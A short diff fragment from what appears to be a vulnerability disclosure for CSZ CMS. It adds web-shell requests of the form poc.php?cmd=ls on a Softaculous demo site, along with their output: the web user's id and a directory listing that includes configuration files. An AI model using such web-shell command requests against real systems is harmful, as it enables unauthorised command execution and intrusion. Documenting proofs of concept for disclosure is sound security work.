@@ -24,6 +24,38 @@
     https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=id
         Output:
 
-uid=1000(soft) gid=1000(soft) groups=1000(soft)
+   uid=1000(soft) gid=1000(soft) groups=1000(soft)
 
+   https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=ls
 
+    Output:
+
+      CHANGELOG
+      CONTRIBUTING.md
+      LICENSE.md
+      README.md
+      SECURITY.md
+      a.php
+      assets
+      cache.config.inc.php
+      config.inc.php
+      config_example.inc.php
+      corecss.css
+      corejs.js
+      cszcms
+      devtoolsbar.config.inc.php
+      env.config.inc.php
+      htaccess.config.inc.php
+      index.php
+      install
+      memcached.config.inc.php
+      nginx_example.com.conf
+      photo
+      poc.php
+      proxy.inc.php
+      redis.config.inc.php
+      system
+      templates
+      test.php
+      
+      
